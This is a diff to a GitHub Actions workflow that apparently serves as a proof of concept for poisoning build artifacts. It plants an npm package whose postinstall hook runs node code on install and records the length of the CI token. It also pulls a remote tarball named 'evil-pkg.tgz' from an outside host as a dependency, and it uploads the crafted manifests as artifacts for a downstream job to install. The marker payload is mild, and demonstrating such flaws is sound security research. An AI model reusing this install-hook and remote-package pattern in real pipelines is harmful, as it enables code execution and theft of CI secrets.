@@ -17,20 +17,32 @@ jobs:
 
       - name: Simulate attacker-controlled artifact payload
         run: |
+          mkdir -p evilpkg2
+          cat > evilpkg2/package.json <<'JSON'
+          {
+            "name": "poc-file",
+            "version": "1.0.0",
+            "scripts": {
+              "postinstall": "node -e \"const fs=require('fs');fs.writeFileSync(process.env.GITHUB_WORKSPACE+'/pwned-file.txt','FILE_DEP_RCE token_len='+(process.env.GITHUB_TOKEN||'').length+'\\n')\""
+            }
+          }
+          JSON
           cat > package.json <<'JSON'
           {
             "name": "poc-root",
             "version": "1.0.0",
             "private": true,
             "allowScripts": {
-              "poc-evil": true
+              "https://raw.githubusercontent.com/PDFtoMark/gab-poc-adobe-lintbot/main/evil-pkg.tgz": true,
+              "file:./evilpkg2": true
             },
             "dependencies": {
-              "poc-evil": "https://raw.githubusercontent.com/PDFtoMark/gab-poc-adobe-lintbot/main/evil-pkg.tgz"
+              "poc-evil": "https://raw.githubusercontent.com/PDFtoMark/gab-poc-adobe-lintbot/main/evil-pkg.tgz",
+              "poc-file": "file:./evilpkg2"
             }
           }
           JSON
-          printf '# Attacker chosen report\n\n![x](https://example.invalid/x.png) posted by artifact\n' > linter-report.txt
+          printf '# Attacker chosen report\n' > linter-report.txt
           ls -la
 
       - name: Upload linter report
@@ -42,4 +54,5 @@ jobs:
             linter-report.txt
             pr-number.txt
             package.json
+            evilpkg2/package.json
           if-no-files-found: ignore
